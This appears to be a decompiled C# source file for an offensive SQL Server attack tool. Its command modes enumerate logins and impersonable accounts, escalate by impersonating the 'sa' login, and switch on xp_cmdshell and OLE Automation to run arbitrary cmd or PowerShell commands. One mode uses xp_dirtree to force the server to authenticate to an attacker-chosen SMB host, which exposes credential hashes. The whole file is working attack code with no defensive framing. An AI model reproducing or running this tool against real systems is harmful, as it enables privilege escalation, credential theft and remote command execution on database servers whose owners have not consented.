using System;
using System.Data.SqlClient;
using System.Diagnostics;

namespace sql
{
	// Token: 0x02000002 RID: 2
	public static class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002048 File Offset: 0x00000248
		public static void Main(string[] args)
		{
			if (args.Length < 1)
			{
				Console.WriteLine("[*] USAGE: " + Process.GetCurrentProcess().ProcessName + " <sqlserver> ");
				Environment.Exit(0);
			}
			string text = args[0];
			string text2 = text;
			string text3 = "master";
			SqlConnection sqlConnection = new SqlConnection(string.Concat(new string[]
			{
				"Server = ",
				text2,
				"; Database = ",
				text3,
				"; Integrated Security = True;"
			}));
			try
			{
				sqlConnection.Open();
				Console.WriteLine("[+] Auth on " + text + " was successful");
			}
			catch
			{
				Console.WriteLine("[+] Auth on " + text + " was not successful");
			}
			try
			{
                if (args[1] == "help")
                {
                    String helpMsg = "[*] "+Process.GetCurrentProcess().ProcessName + " <sqlserver> enum\n[*] "+Process.GetCurrentProcess().ProcessName + " <sqlserver> unc <smbserver> <smbpath>\n[*] "+Process.GetCurrentProcess().ProcessName + " <sqlserver> xpcmd <command>\n[*] "+Process.GetCurrentProcess().ProcessName + " <sqlserver> spcreate <command> <commandType>\n[*] "+Process.GetCurrentProcess().ProcessName + " <sqlserver> runsql <sqlcommand>\n";
                    Console.WriteLine(helpMsg);
                    Environment.Exit(0);
                }
				if (args[1] == "enum")
				{
					Program.EnumAuth(text, sqlConnection);
				}
				if (args[1] == "unc")
				{
					string smbServer = args[2];
					string smbPath = args[3];
					Program.UncInject(text, sqlConnection, smbServer, smbPath);
				}
				if (args[1] == "xpcmd")
				{
					string text4 = args[2];
					Console.WriteLine("[*] Attempting to run " + text4);
					Program.XpCmdShell(text, sqlConnection, text4);
				}
				if (args[1] == "spcreate")
				{
					string text5 = args[2];
					string commandType = args[3];
					Console.WriteLine("[*] Attempting to run " + text5);
					Program.SpOaCreate(text, sqlConnection, text5, commandType);
				}
				if (args[1] == "runsql")
				{
					string sqlCmd = args[2];
					Program.RunSql(text, sqlConnection, sqlCmd);
				}
				
			}
			catch
			{
				Console.WriteLine("");
			}
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000021F0 File Offset: 0x000003F0
		public static void EnumAuth(string server, SqlConnection con)
		{
			Console.WriteLine("[*] Checking for system user");
			SqlDataReader sqlDataReader = new SqlCommand("SELECT SYSTEM_USER;", con).ExecuteReader();
			sqlDataReader.Read();
			string str = "[+] Logged in as: ";
			object obj = sqlDataReader[0];
			Console.WriteLine(str + ((obj != null) ? obj.ToString() : null));
			sqlDataReader.Close();
			Console.WriteLine("[*] Checking for database user");
			sqlDataReader = new SqlCommand("SELECT CURRENT_USER;", con).ExecuteReader();
			sqlDataReader.Read();
			string str2 = "[+] SQL user: ";
			object obj2 = sqlDataReader[0];
			Console.WriteLine(str2 + ((obj2 != null) ? obj2.ToString() : null));
			sqlDataReader.Close();
			Console.WriteLine("[*] Checking user role");
			sqlDataReader = new SqlCommand("SELECT IS_SRVROLEMEMBER('public');", con).ExecuteReader();
			sqlDataReader.Read();
			if (int.Parse(sqlDataReader[0].ToString()) == 1)
			{
				Console.WriteLine("[+] User is a member of public role");
			}
			else
			{
				Console.WriteLine("[-] User is NOT a member of public role");
			}
			sqlDataReader.Close();
			sqlDataReader = new SqlCommand("SELECT IS_SRVROLEMEMBER('sysadmin');", con).ExecuteReader();
			sqlDataReader.Read();
			if (int.Parse(sqlDataReader[0].ToString()) == 1)
			{
				Console.WriteLine("[+] User is a member of sysadmin role");
			}
			else
			{
				Console.WriteLine("[+] User is NOT a member of sysadmin role");
			}
			sqlDataReader.Close();
			Console.WriteLine("Checking if impersonation is possible");
			sqlDataReader = new SqlCommand("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ", con).ExecuteReader();
			while (sqlDataReader.Read())
			{
				string str3 = "[*] Logins that can be impersonated: ";
				object obj3 = sqlDataReader[0];
				Console.WriteLine(str3 + ((obj3 != null) ? obj3.ToString() : null));
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002372 File Offset: 0x00000572
		public static void UncInject(string server, SqlConnection con, string SmbServer, string SmbPath)
		{
			new SqlCommand(string.Concat(new string[]
			{
				"EXEC master..xp_dirtree \"\\\\",
				SmbServer,
				"\\\\",
				SmbPath,
				"\";"
			}), con).ExecuteReader().Close();
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000023B0 File Offset: 0x000005B0
		public static void XpCmdShell(string server, SqlConnection con, string cmdCommand)
		{
			SqlCommand sqlCommand = new SqlCommand("SELECT IS_SRVROLEMEMBER('sysadmin');", con);
			SqlDataReader sqlDataReader = sqlCommand.ExecuteReader();
			sqlDataReader.Read();
			int num = int.Parse(sqlDataReader[0].ToString());
			sqlDataReader.Close();
			if (num != 1)
			{
				string cmdText = "EXECUTE AS LOGIN = 'sa';";
				string cmdText2 = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; ";
				string text = "EXEC xp_cmdshell \"" + cmdCommand + "\";";
				sqlCommand = new SqlCommand(cmdText, con);
				sqlDataReader = sqlCommand.ExecuteReader();
				sqlDataReader.Close();
				sqlCommand = new SqlCommand(cmdText2, con);
				sqlDataReader = sqlCommand.ExecuteReader();
				sqlDataReader.Close();
				sqlCommand = new SqlCommand(text, con);
				Console.WriteLine(text);
				sqlDataReader = sqlCommand.ExecuteReader();
				sqlDataReader.Read();
				string str = "> ";
				object obj = sqlDataReader[0];
				Console.WriteLine(cmdCommand + str + ((obj != null) ? obj.ToString() : null));
				sqlDataReader.Close();
				return;
			}
			string cmdText3 = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; ";
			string text2 = "EXEC xp_cmdshell \"" + cmdCommand + "\";";
			Console.WriteLine(text2);
			sqlCommand = new SqlCommand(cmdText3, con);
			sqlDataReader = sqlCommand.ExecuteReader();
			sqlDataReader.Close();
			sqlCommand = new SqlCommand(text2, con);
			sqlDataReader = sqlCommand.ExecuteReader();
			sqlDataReader.Read();
			string str2 = " Output: ";
			object obj2 = sqlDataReader[0];
			Console.WriteLine(cmdCommand + str2 + ((obj2 != null) ? obj2.ToString() : null));
			sqlDataReader.Close();
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000024F4 File Offset: 0x000006F4
		public static void SpOaCreate(string server, SqlConnection con, string cmdCommand, string CommandType)
		{
			string text = "";
			if (CommandType == "p")
			{
				text = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell \"" + cmdCommand + "\"';";
			}
			if (CommandType == "c")
			{
				text = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"" + cmdCommand + "\"';";
			}
			SqlDataReader sqlDataReader = new SqlCommand("SELECT IS_SRVROLEMEMBER('sysadmin');", con).ExecuteReader();
			sqlDataReader.Read();
			int num = int.Parse(sqlDataReader[0].ToString());
			sqlDataReader.Close();
			if (num != 1)
			{
				string cmdText = "EXECUTE AS LOGIN = 'sa';";
				string cmdText2 = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; ";
				Console.WriteLine(text);
				sqlDataReader = new SqlCommand(cmdText, con).ExecuteReader();
				sqlDataReader.Close();
				sqlDataReader = new SqlCommand(cmdText2, con).ExecuteReader();
				sqlDataReader.Close();
				sqlDataReader = new SqlCommand(text, con).ExecuteReader();
				return;
			}
			sqlDataReader = new SqlCommand("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; ", con).ExecuteReader();
			sqlDataReader.Close();
			sqlDataReader = new SqlCommand(text, con).ExecuteReader();
			sqlDataReader.Close();
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000025E4 File Offset: 0x000007E4
		public static void RunSql(string server, SqlConnection con, string sqlCmd)
		{
			SqlDataReader sqlDataReader = new SqlCommand(sqlCmd, con).ExecuteReader();
			while (sqlDataReader.Read())
			{
				string str = "Output> ";
				object obj = sqlDataReader[0];
				Console.WriteLine(str + ((obj != null) ? obj.ToString() : null));
			}
			sqlDataReader.Close();
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002630 File Offset: 0x00000830
		
	}
}
